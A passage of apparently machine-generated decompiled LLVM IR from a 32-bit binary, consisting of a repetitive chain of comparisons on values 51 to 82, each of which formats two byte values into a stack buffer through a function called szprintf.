  %v13_804a7a4 = icmp eq i32 %v2_8049ccc, 51
  %v1_804a7a8 = icmp eq i1 %v13_804a7a4, false
  br i1 %v1_804a7a8, label %dec_label_pc_804a7da, label %dec_label_pc_804a7aa

dec_label_pc_804a7aa:                             ; preds = %dec_label_pc_804a7a4
  %v0_804a7aa = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a7aa = zext i8 %v0_804a7aa to i32
  store i32 %v1_804a7aa, i32* @edx, align 4
  %v0_804a7b4 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a7b4 = zext i8 %v0_804a7b4 to i32
  %v2_804a7c3 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a7d5 = call i32 @szprintf(i32 %v2_804a7c3, i32 ptrtoint ([14 x i8]* @global_var_8068cb0.93 to i32), i32 %v1_804a7b4)
  br label %dec_label_pc_804a7da

dec_label_pc_804a7da:                             ; preds = %dec_label_pc_804a7a4, %dec_label_pc_804a7aa
  %v13_804a7da = icmp eq i32 %v2_8049ccc, 52
  %v1_804a7de = icmp eq i1 %v13_804a7da, false
  br i1 %v1_804a7de, label %dec_label_pc_804a810, label %dec_label_pc_804a7e0

dec_label_pc_804a7e0:                             ; preds = %dec_label_pc_804a7da
  %v0_804a7e0 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a7e0 = zext i8 %v0_804a7e0 to i32
  store i32 %v1_804a7e0, i32* @edx, align 4
  %v0_804a7ea = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a7ea = zext i8 %v0_804a7ea to i32
  %v2_804a7f9 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a80b = call i32 @szprintf(i32 %v2_804a7f9, i32 ptrtoint ([14 x i8]* @global_var_8068cbe.94 to i32), i32 %v1_804a7ea)
  br label %dec_label_pc_804a810

dec_label_pc_804a810:                             ; preds = %dec_label_pc_804a7da, %dec_label_pc_804a7e0
  %v13_804a810 = icmp eq i32 %v2_8049ccc, 53
  %v1_804a814 = icmp eq i1 %v13_804a810, false
  br i1 %v1_804a814, label %dec_label_pc_804a846, label %dec_label_pc_804a816

dec_label_pc_804a816:                             ; preds = %dec_label_pc_804a810
  %v0_804a816 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a816 = zext i8 %v0_804a816 to i32
  store i32 %v1_804a816, i32* @edx, align 4
  %v0_804a820 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a820 = zext i8 %v0_804a820 to i32
  %v2_804a82f = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a841 = call i32 @szprintf(i32 %v2_804a82f, i32 ptrtoint ([14 x i8]* @global_var_8068ccc.95 to i32), i32 %v1_804a820)
  br label %dec_label_pc_804a846

dec_label_pc_804a846:                             ; preds = %dec_label_pc_804a810, %dec_label_pc_804a816
  %v13_804a846 = icmp eq i32 %v2_8049ccc, 54
  %v1_804a84a = icmp eq i1 %v13_804a846, false
  br i1 %v1_804a84a, label %dec_label_pc_804a87c, label %dec_label_pc_804a84c

dec_label_pc_804a84c:                             ; preds = %dec_label_pc_804a846
  %v0_804a84c = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a84c = zext i8 %v0_804a84c to i32
  store i32 %v1_804a84c, i32* @edx, align 4
  %v0_804a856 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a856 = zext i8 %v0_804a856 to i32
  %v2_804a865 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a877 = call i32 @szprintf(i32 %v2_804a865, i32 ptrtoint ([14 x i8]* @global_var_8068cda.96 to i32), i32 %v1_804a856)
  br label %dec_label_pc_804a87c

dec_label_pc_804a87c:                             ; preds = %dec_label_pc_804a846, %dec_label_pc_804a84c
  %v13_804a87c = icmp eq i32 %v2_8049ccc, 55
  %v1_804a880 = icmp eq i1 %v13_804a87c, false
  br i1 %v1_804a880, label %dec_label_pc_804a8b2, label %dec_label_pc_804a882

dec_label_pc_804a882:                             ; preds = %dec_label_pc_804a87c
  %v0_804a882 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a882 = zext i8 %v0_804a882 to i32
  store i32 %v1_804a882, i32* @edx, align 4
  %v0_804a88c = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a88c = zext i8 %v0_804a88c to i32
  %v2_804a89b = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a8ad = call i32 @szprintf(i32 %v2_804a89b, i32 ptrtoint ([13 x i8]* @global_var_8068ce8.97 to i32), i32 %v1_804a88c)
  br label %dec_label_pc_804a8b2

dec_label_pc_804a8b2:                             ; preds = %dec_label_pc_804a87c, %dec_label_pc_804a882
  %v13_804a8b2 = icmp eq i32 %v2_8049ccc, 56
  %v1_804a8b6 = icmp eq i1 %v13_804a8b2, false
  br i1 %v1_804a8b6, label %dec_label_pc_804a8e8, label %dec_label_pc_804a8b8

dec_label_pc_804a8b8:                             ; preds = %dec_label_pc_804a8b2
  %v0_804a8b8 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a8b8 = zext i8 %v0_804a8b8 to i32
  store i32 %v1_804a8b8, i32* @edx, align 4
  %v0_804a8c2 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a8c2 = zext i8 %v0_804a8c2 to i32
  %v2_804a8d1 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a8e3 = call i32 @szprintf(i32 %v2_804a8d1, i32 ptrtoint ([13 x i8]* @global_var_8068cf5.98 to i32), i32 %v1_804a8c2)
  br label %dec_label_pc_804a8e8

dec_label_pc_804a8e8:                             ; preds = %dec_label_pc_804a8b2, %dec_label_pc_804a8b8
  %v13_804a8e8 = icmp eq i32 %v2_8049ccc, 57
  %v1_804a8ec = icmp eq i1 %v13_804a8e8, false
  br i1 %v1_804a8ec, label %dec_label_pc_804a91e, label %dec_label_pc_804a8ee

dec_label_pc_804a8ee:                             ; preds = %dec_label_pc_804a8e8
  %v0_804a8ee = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a8ee = zext i8 %v0_804a8ee to i32
  store i32 %v1_804a8ee, i32* @edx, align 4
  %v0_804a8f8 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a8f8 = zext i8 %v0_804a8f8 to i32
  %v2_804a907 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a919 = call i32 @szprintf(i32 %v2_804a907, i32 ptrtoint ([13 x i8]* @global_var_8068d02.99 to i32), i32 %v1_804a8f8)
  br label %dec_label_pc_804a91e

dec_label_pc_804a91e:                             ; preds = %dec_label_pc_804a8e8, %dec_label_pc_804a8ee
  %v13_804a91e = icmp eq i32 %v2_8049ccc, 58
  %v1_804a922 = icmp eq i1 %v13_804a91e, false
  br i1 %v1_804a922, label %dec_label_pc_804a954, label %dec_label_pc_804a924

dec_label_pc_804a924:                             ; preds = %dec_label_pc_804a91e
  %v0_804a924 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a924 = zext i8 %v0_804a924 to i32
  store i32 %v1_804a924, i32* @edx, align 4
  %v0_804a92e = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a92e = zext i8 %v0_804a92e to i32
  %v2_804a93d = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a94f = call i32 @szprintf(i32 %v2_804a93d, i32 ptrtoint ([13 x i8]* @global_var_8068d0f.100 to i32), i32 %v1_804a92e)
  br label %dec_label_pc_804a954

dec_label_pc_804a954:                             ; preds = %dec_label_pc_804a91e, %dec_label_pc_804a924
  %v13_804a954 = icmp eq i32 %v2_8049ccc, 59
  %v1_804a958 = icmp eq i1 %v13_804a954, false
  br i1 %v1_804a958, label %dec_label_pc_804a98a, label %dec_label_pc_804a95a

dec_label_pc_804a95a:                             ; preds = %dec_label_pc_804a954
  %v0_804a95a = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a95a = zext i8 %v0_804a95a to i32
  store i32 %v1_804a95a, i32* @edx, align 4
  %v0_804a964 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a964 = zext i8 %v0_804a964 to i32
  %v2_804a973 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a985 = call i32 @szprintf(i32 %v2_804a973, i32 ptrtoint ([13 x i8]* @global_var_8068d1c.101 to i32), i32 %v1_804a964)
  br label %dec_label_pc_804a98a

dec_label_pc_804a98a:                             ; preds = %dec_label_pc_804a954, %dec_label_pc_804a95a
  %v13_804a98a = icmp eq i32 %v2_8049ccc, 60
  %v1_804a98e = icmp eq i1 %v13_804a98a, false
  br i1 %v1_804a98e, label %dec_label_pc_804a9c0, label %dec_label_pc_804a990

dec_label_pc_804a990:                             ; preds = %dec_label_pc_804a98a
  %v0_804a990 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a990 = zext i8 %v0_804a990 to i32
  store i32 %v1_804a990, i32* @edx, align 4
  %v0_804a99a = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a99a = zext i8 %v0_804a99a to i32
  %v2_804a9a9 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a9bb = call i32 @szprintf(i32 %v2_804a9a9, i32 ptrtoint ([12 x i8]* @global_var_8068d29.102 to i32), i32 %v1_804a99a)
  br label %dec_label_pc_804a9c0

dec_label_pc_804a9c0:                             ; preds = %dec_label_pc_804a98a, %dec_label_pc_804a990
  %v13_804a9c0 = icmp eq i32 %v2_8049ccc, 61
  %v1_804a9c4 = icmp eq i1 %v13_804a9c0, false
  br i1 %v1_804a9c4, label %dec_label_pc_804a9f6, label %dec_label_pc_804a9c6

dec_label_pc_804a9c6:                             ; preds = %dec_label_pc_804a9c0
  %v0_804a9c6 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a9c6 = zext i8 %v0_804a9c6 to i32
  store i32 %v1_804a9c6, i32* @edx, align 4
  %v0_804a9d0 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a9d0 = zext i8 %v0_804a9d0 to i32
  %v2_804a9df = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a9f1 = call i32 @szprintf(i32 %v2_804a9df, i32 ptrtoint ([13 x i8]* @global_var_8068d35.103 to i32), i32 %v1_804a9d0)
  br label %dec_label_pc_804a9f6

dec_label_pc_804a9f6:                             ; preds = %dec_label_pc_804a9c0, %dec_label_pc_804a9c6
  %v13_804a9f6 = icmp eq i32 %v2_8049ccc, 62
  %v1_804a9fa = icmp eq i1 %v13_804a9f6, false
  br i1 %v1_804a9fa, label %dec_label_pc_804aa2c, label %dec_label_pc_804a9fc

dec_label_pc_804a9fc:                             ; preds = %dec_label_pc_804a9f6
  %v0_804a9fc = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a9fc = zext i8 %v0_804a9fc to i32
  store i32 %v1_804a9fc, i32* @edx, align 4
  %v0_804aa06 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804aa06 = zext i8 %v0_804aa06 to i32
  %v2_804aa15 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804aa27 = call i32 @szprintf(i32 %v2_804aa15, i32 ptrtoint ([13 x i8]* @global_var_8068d42.104 to i32), i32 %v1_804aa06)
  br label %dec_label_pc_804aa2c

dec_label_pc_804aa2c:                             ; preds = %dec_label_pc_804a9f6, %dec_label_pc_804a9fc
  %v13_804aa2c = icmp eq i32 %v2_8049ccc, 63
  %v1_804aa30 = icmp eq i1 %v13_804aa2c, false
  br i1 %v1_804aa30, label %dec_label_pc_804aa62, label %dec_label_pc_804aa32

dec_label_pc_804aa32:                             ; preds = %dec_label_pc_804aa2c
  %v0_804aa32 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804aa32 = zext i8 %v0_804aa32 to i32
  store i32 %v1_804aa32, i32* @edx, align 4
  %v0_804aa3c = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804aa3c = zext i8 %v0_804aa3c to i32
  %v2_804aa4b = ptrtoint i32* %stack_var_-28 to i32
  %v4_804aa5d = call i32 @szprintf(i32 %v2_804aa4b, i32 ptrtoint ([13 x i8]* @global_var_8068d4f.105 to i32), i32 %v1_804aa3c)
  br label %dec_label_pc_804aa62

dec_label_pc_804aa62:                             ; preds = %dec_label_pc_804aa2c, %dec_label_pc_804aa32
  %v10_804aa62 = icmp eq i32 %v2_8049ccc, 64
  %v1_804aa66 = icmp eq i1 %v10_804aa62, false
  br i1 %v1_804aa66, label %dec_label_pc_804aa98, label %dec_label_pc_804aa68

dec_label_pc_804aa68:                             ; preds = %dec_label_pc_804aa62
  %v0_804aa68 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804aa68 = zext i8 %v0_804aa68 to i32
  store i32 %v1_804aa68, i32* @edx, align 4
  %v0_804aa72 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804aa72 = zext i8 %v0_804aa72 to i32
  %v2_804aa81 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804aa93 = call i32 @szprintf(i32 %v2_804aa81, i32 ptrtoint ([13 x i8]* @global_var_8068d5c.106 to i32), i32 %v1_804aa72)
  br label %dec_label_pc_804aa98

dec_label_pc_804aa98:                             ; preds = %dec_label_pc_804aa62, %dec_label_pc_804aa68
  %v13_804aa98 = icmp eq i32 %v2_8049ccc, 65
  %v1_804aa9c = icmp eq i1 %v13_804aa98, false
  br i1 %v1_804aa9c, label %dec_label_pc_804aace, label %dec_label_pc_804aa9e

dec_label_pc_804aa9e:                             ; preds = %dec_label_pc_804aa98
  %v0_804aa9e = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804aa9e = zext i8 %v0_804aa9e to i32
  store i32 %v1_804aa9e, i32* @edx, align 4
  %v0_804aaa8 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804aaa8 = zext i8 %v0_804aaa8 to i32
  %v2_804aab7 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804aac9 = call i32 @szprintf(i32 %v2_804aab7, i32 ptrtoint ([13 x i8]* @global_var_8068d69.107 to i32), i32 %v1_804aaa8)
  br label %dec_label_pc_804aace

dec_label_pc_804aace:                             ; preds = %dec_label_pc_804aa98, %dec_label_pc_804aa9e
  %v13_804aace = icmp eq i32 %v2_8049ccc, 66
  %v1_804aad2 = icmp eq i1 %v13_804aace, false
  br i1 %v1_804aad2, label %dec_label_pc_804ab04, label %dec_label_pc_804aad4

dec_label_pc_804aad4:                             ; preds = %dec_label_pc_804aace
  %v0_804aad4 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804aad4 = zext i8 %v0_804aad4 to i32
  store i32 %v1_804aad4, i32* @edx, align 4
  %v0_804aade = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804aade = zext i8 %v0_804aade to i32
  %v2_804aaed = ptrtoint i32* %stack_var_-28 to i32
  %v4_804aaff = call i32 @szprintf(i32 %v2_804aaed, i32 ptrtoint ([13 x i8]* @global_var_8068d76.108 to i32), i32 %v1_804aade)
  br label %dec_label_pc_804ab04

dec_label_pc_804ab04:                             ; preds = %dec_label_pc_804aace, %dec_label_pc_804aad4
  %v13_804ab04 = icmp eq i32 %v2_8049ccc, 67
  %v1_804ab08 = icmp eq i1 %v13_804ab04, false
  br i1 %v1_804ab08, label %dec_label_pc_804ab3a, label %dec_label_pc_804ab0a

dec_label_pc_804ab0a:                             ; preds = %dec_label_pc_804ab04
  %v0_804ab0a = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804ab0a = zext i8 %v0_804ab0a to i32
  store i32 %v1_804ab0a, i32* @edx, align 4
  %v0_804ab14 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804ab14 = zext i8 %v0_804ab14 to i32
  %v2_804ab23 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804ab35 = call i32 @szprintf(i32 %v2_804ab23, i32 ptrtoint ([13 x i8]* @global_var_8068d83.109 to i32), i32 %v1_804ab14)
  br label %dec_label_pc_804ab3a

dec_label_pc_804ab3a:                             ; preds = %dec_label_pc_804ab04, %dec_label_pc_804ab0a
  %v13_804ab3a = icmp eq i32 %v2_8049ccc, 68
  %v1_804ab3e = icmp eq i1 %v13_804ab3a, false
  br i1 %v1_804ab3e, label %dec_label_pc_804ab70, label %dec_label_pc_804ab40

dec_label_pc_804ab40:                             ; preds = %dec_label_pc_804ab3a
  %v0_804ab40 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804ab40 = zext i8 %v0_804ab40 to i32
  store i32 %v1_804ab40, i32* @edx, align 4
  %v0_804ab4a = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804ab4a = zext i8 %v0_804ab4a to i32
  %v2_804ab59 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804ab6b = call i32 @szprintf(i32 %v2_804ab59, i32 ptrtoint ([13 x i8]* @global_var_8068d90.110 to i32), i32 %v1_804ab4a)
  br label %dec_label_pc_804ab70

dec_label_pc_804ab70:                             ; preds = %dec_label_pc_804ab3a, %dec_label_pc_804ab40
  %v13_804ab70 = icmp eq i32 %v2_8049ccc, 69
  %v1_804ab74 = icmp eq i1 %v13_804ab70, false
  br i1 %v1_804ab74, label %dec_label_pc_804aba6, label %dec_label_pc_804ab76

dec_label_pc_804ab76:                             ; preds = %dec_label_pc_804ab70
  %v0_804ab76 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804ab76 = zext i8 %v0_804ab76 to i32
  store i32 %v1_804ab76, i32* @edx, align 4
  %v0_804ab80 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804ab80 = zext i8 %v0_804ab80 to i32
  %v2_804ab8f = ptrtoint i32* %stack_var_-28 to i32
  %v4_804aba1 = call i32 @szprintf(i32 %v2_804ab8f, i32 ptrtoint ([13 x i8]* @global_var_8068d9d.111 to i32), i32 %v1_804ab80)
  br label %dec_label_pc_804aba6

dec_label_pc_804aba6:                             ; preds = %dec_label_pc_804ab70, %dec_label_pc_804ab76
  %v13_804aba6 = icmp eq i32 %v2_8049ccc, 70
  %v1_804abaa = icmp eq i1 %v13_804aba6, false
  br i1 %v1_804abaa, label %dec_label_pc_804abdc, label %dec_label_pc_804abac

dec_label_pc_804abac:                             ; preds = %dec_label_pc_804aba6
  %v0_804abac = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804abac = zext i8 %v0_804abac to i32
  store i32 %v1_804abac, i32* @edx, align 4
  %v0_804abb6 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804abb6 = zext i8 %v0_804abb6 to i32
  %v2_804abc5 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804abd7 = call i32 @szprintf(i32 %v2_804abc5, i32 ptrtoint ([12 x i8]* @global_var_8068daa.112 to i32), i32 %v1_804abb6)
  br label %dec_label_pc_804abdc

dec_label_pc_804abdc:                             ; preds = %dec_label_pc_804aba6, %dec_label_pc_804abac
  %v13_804abdc = icmp eq i32 %v2_8049ccc, 71
  %v1_804abe0 = icmp eq i1 %v13_804abdc, false
  br i1 %v1_804abe0, label %dec_label_pc_804ac12, label %dec_label_pc_804abe2

dec_label_pc_804abe2:                             ; preds = %dec_label_pc_804abdc
  %v0_804abe2 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804abe2 = zext i8 %v0_804abe2 to i32
  store i32 %v1_804abe2, i32* @edx, align 4
  %v0_804abec = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804abec = zext i8 %v0_804abec to i32
  %v2_804abfb = ptrtoint i32* %stack_var_-28 to i32
  %v4_804ac0d = call i32 @szprintf(i32 %v2_804abfb, i32 ptrtoint ([13 x i8]* @global_var_8068db6.113 to i32), i32 %v1_804abec)
  br label %dec_label_pc_804ac12

dec_label_pc_804ac12:                             ; preds = %dec_label_pc_804abdc, %dec_label_pc_804abe2
  %v13_804ac12 = icmp eq i32 %v2_8049ccc, 72
  %v1_804ac16 = icmp eq i1 %v13_804ac12, false
  br i1 %v1_804ac16, label %dec_label_pc_804ac48, label %dec_label_pc_804ac18

dec_label_pc_804ac18:                             ; preds = %dec_label_pc_804ac12
  %v0_804ac18 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804ac18 = zext i8 %v0_804ac18 to i32
  store i32 %v1_804ac18, i32* @edx, align 4
  %v0_804ac22 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804ac22 = zext i8 %v0_804ac22 to i32
  %v2_804ac31 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804ac43 = call i32 @szprintf(i32 %v2_804ac31, i32 ptrtoint ([13 x i8]* @global_var_8068dc3.114 to i32), i32 %v1_804ac22)
  br label %dec_label_pc_804ac48

dec_label_pc_804ac48:                             ; preds = %dec_label_pc_804ac12, %dec_label_pc_804ac18
  %v13_804ac48 = icmp eq i32 %v2_8049ccc, 73
  %v1_804ac4c = icmp eq i1 %v13_804ac48, false
  br i1 %v1_804ac4c, label %dec_label_pc_804ac7e, label %dec_label_pc_804ac4e

dec_label_pc_804ac4e:                             ; preds = %dec_label_pc_804ac48
  %v0_804ac4e = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804ac4e = zext i8 %v0_804ac4e to i32
  store i32 %v1_804ac4e, i32* @edx, align 4
  %v0_804ac58 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804ac58 = zext i8 %v0_804ac58 to i32
  %v2_804ac67 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804ac79 = call i32 @szprintf(i32 %v2_804ac67, i32 ptrtoint ([12 x i8]* @global_var_8068dd0.115 to i32), i32 %v1_804ac58)
  br label %dec_label_pc_804ac7e

dec_label_pc_804ac7e:                             ; preds = %dec_label_pc_804ac48, %dec_label_pc_804ac4e
  %v13_804ac7e = icmp eq i32 %v2_8049ccc, 74
  %v1_804ac82 = icmp eq i1 %v13_804ac7e, false
  br i1 %v1_804ac82, label %dec_label_pc_804acb4, label %dec_label_pc_804ac84

dec_label_pc_804ac84:                             ; preds = %dec_label_pc_804ac7e
  %v0_804ac84 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804ac84 = zext i8 %v0_804ac84 to i32
  store i32 %v1_804ac84, i32* @edx, align 4
  %v0_804ac8e = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804ac8e = zext i8 %v0_804ac8e to i32
  %v2_804ac9d = ptrtoint i32* %stack_var_-28 to i32
  %v4_804acaf = call i32 @szprintf(i32 %v2_804ac9d, i32 ptrtoint ([12 x i8]* @global_var_8068ddc.116 to i32), i32 %v1_804ac8e)
  br label %dec_label_pc_804acb4

dec_label_pc_804acb4:                             ; preds = %dec_label_pc_804ac7e, %dec_label_pc_804ac84
  %v13_804acb4 = icmp eq i32 %v2_8049ccc, 75
  %v1_804acb8 = icmp eq i1 %v13_804acb4, false
  br i1 %v1_804acb8, label %dec_label_pc_804acea, label %dec_label_pc_804acba

dec_label_pc_804acba:                             ; preds = %dec_label_pc_804acb4
  %v0_804acba = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804acba = zext i8 %v0_804acba to i32
  store i32 %v1_804acba, i32* @edx, align 4
  %v0_804acc4 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804acc4 = zext i8 %v0_804acc4 to i32
  %v2_804acd3 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804ace5 = call i32 @szprintf(i32 %v2_804acd3, i32 ptrtoint ([13 x i8]* @global_var_8068de8.117 to i32), i32 %v1_804acc4)
  br label %dec_label_pc_804acea

dec_label_pc_804acea:                             ; preds = %dec_label_pc_804acb4, %dec_label_pc_804acba
  %v13_804acea = icmp eq i32 %v2_8049ccc, 76
  %v1_804acee = icmp eq i1 %v13_804acea, false
  br i1 %v1_804acee, label %dec_label_pc_804ad20, label %dec_label_pc_804acf0

dec_label_pc_804acf0:                             ; preds = %dec_label_pc_804acea
  %v0_804acf0 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804acf0 = zext i8 %v0_804acf0 to i32
  store i32 %v1_804acf0, i32* @edx, align 4
  %v0_804acfa = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804acfa = zext i8 %v0_804acfa to i32
  %v2_804ad09 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804ad1b = call i32 @szprintf(i32 %v2_804ad09, i32 ptrtoint ([13 x i8]* @global_var_8068df5.118 to i32), i32 %v1_804acfa)
  br label %dec_label_pc_804ad20

dec_label_pc_804ad20:                             ; preds = %dec_label_pc_804acea, %dec_label_pc_804acf0
  %v13_804ad20 = icmp eq i32 %v2_8049ccc, 77
  %v1_804ad24 = icmp eq i1 %v13_804ad20, false
  br i1 %v1_804ad24, label %dec_label_pc_804ad56, label %dec_label_pc_804ad26

dec_label_pc_804ad26:                             ; preds = %dec_label_pc_804ad20
  %v0_804ad26 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804ad26 = zext i8 %v0_804ad26 to i32
  store i32 %v1_804ad26, i32* @edx, align 4
  %v0_804ad30 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804ad30 = zext i8 %v0_804ad30 to i32
  %v2_804ad3f = ptrtoint i32* %stack_var_-28 to i32
  %v4_804ad51 = call i32 @szprintf(i32 %v2_804ad3f, i32 ptrtoint ([13 x i8]* @global_var_8068e02.119 to i32), i32 %v1_804ad30)
  br label %dec_label_pc_804ad56

dec_label_pc_804ad56:                             ; preds = %dec_label_pc_804ad20, %dec_label_pc_804ad26
  %v13_804ad56 = icmp eq i32 %v2_8049ccc, 78
  %v1_804ad5a = icmp eq i1 %v13_804ad56, false
  br i1 %v1_804ad5a, label %dec_label_pc_804ad8c, label %dec_label_pc_804ad5c

dec_label_pc_804ad5c:                             ; preds = %dec_label_pc_804ad56
  %v0_804ad5c = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804ad5c = zext i8 %v0_804ad5c to i32
  store i32 %v1_804ad5c, i32* @edx, align 4
  %v0_804ad66 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804ad66 = zext i8 %v0_804ad66 to i32
  %v2_804ad75 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804ad87 = call i32 @szprintf(i32 %v2_804ad75, i32 ptrtoint ([13 x i8]* @global_var_8068e0f.120 to i32), i32 %v1_804ad66)
  br label %dec_label_pc_804ad8c

dec_label_pc_804ad8c:                             ; preds = %dec_label_pc_804ad56, %dec_label_pc_804ad5c
  %v13_804ad8c = icmp eq i32 %v2_8049ccc, 79
  %v1_804ad90 = icmp eq i1 %v13_804ad8c, false
  br i1 %v1_804ad90, label %dec_label_pc_804adc2, label %dec_label_pc_804ad92

dec_label_pc_804ad92:                             ; preds = %dec_label_pc_804ad8c
  %v0_804ad92 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804ad92 = zext i8 %v0_804ad92 to i32
  store i32 %v1_804ad92, i32* @edx, align 4
  %v0_804ad9c = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804ad9c = zext i8 %v0_804ad9c to i32
  %v2_804adab = ptrtoint i32* %stack_var_-28 to i32
  %v4_804adbd = call i32 @szprintf(i32 %v2_804adab, i32 ptrtoint ([13 x i8]* @global_var_8068e1c.121 to i32), i32 %v1_804ad9c)
  br label %dec_label_pc_804adc2

dec_label_pc_804adc2:                             ; preds = %dec_label_pc_804ad8c, %dec_label_pc_804ad92
  %v10_804adc2 = icmp eq i32 %v2_8049ccc, 80
  %v1_804adc6 = icmp eq i1 %v10_804adc2, false
  br i1 %v1_804adc6, label %dec_label_pc_804adf8, label %dec_label_pc_804adc8

dec_label_pc_804adc8:                             ; preds = %dec_label_pc_804adc2
  %v0_804adc8 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804adc8 = zext i8 %v0_804adc8 to i32
  store i32 %v1_804adc8, i32* @edx, align 4
  %v0_804add2 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804add2 = zext i8 %v0_804add2 to i32
  %v2_804ade1 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804adf3 = call i32 @szprintf(i32 %v2_804ade1, i32 ptrtoint ([12 x i8]* @global_var_8068e29.122 to i32), i32 %v1_804add2)
  br label %dec_label_pc_804adf8

dec_label_pc_804adf8:                             ; preds = %dec_label_pc_804adc2, %dec_label_pc_804adc8
  %v13_804adf8 = icmp eq i32 %v2_8049ccc, 81
  %v1_804adfc = icmp eq i1 %v13_804adf8, false
  br i1 %v1_804adfc, label %dec_label_pc_804ae2e, label %dec_label_pc_804adfe

dec_label_pc_804adfe:                             ; preds = %dec_label_pc_804adf8
  %v0_804adfe = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804adfe = zext i8 %v0_804adfe to i32
  store i32 %v1_804adfe, i32* @edx, align 4
  %v0_804ae08 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804ae08 = zext i8 %v0_804ae08 to i32
  %v2_804ae17 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804ae29 = call i32 @szprintf(i32 %v2_804ae17, i32 ptrtoint ([13 x i8]* @global_var_8068e35.123 to i32), i32 %v1_804ae08)
  br label %dec_label_pc_804ae2e

dec_label_pc_804ae2e:                             ; preds = %dec_label_pc_804adf8, %dec_label_pc_804adfe
  %v13_804ae2e = icmp eq i32 %v2_8049ccc, 82
  %v1_804ae32 = icmp eq i1 %v13_804ae2e, false
  br i1 %v1_804ae32, label %dec_label_pc_804ae64, label %dec_label_pc_804ae34

dec_label_pc_804ae34:                             ; preds = %dec_label_pc_804ae2e
  %v0_804ae34 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804ae34 = zext i8 %v0_804ae34 to i32
  store i32 %v1_804ae34, i32* @edx, align 4
  %v0_804ae3e = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804ae3e = zext i8 %v0_804ae3e to i32
  %v2_804ae4d = ptrtoint i32* %stack_var_-28 to i32
  %v4_804ae5f = call i32 @szprintf(i32 %v2_804ae4d, i32 ptrtoint ([13 x i8]* @global_var_8068e42.124 to i32), i32 %v1_804ae3e)
  br label %dec_label_pc_804ae64

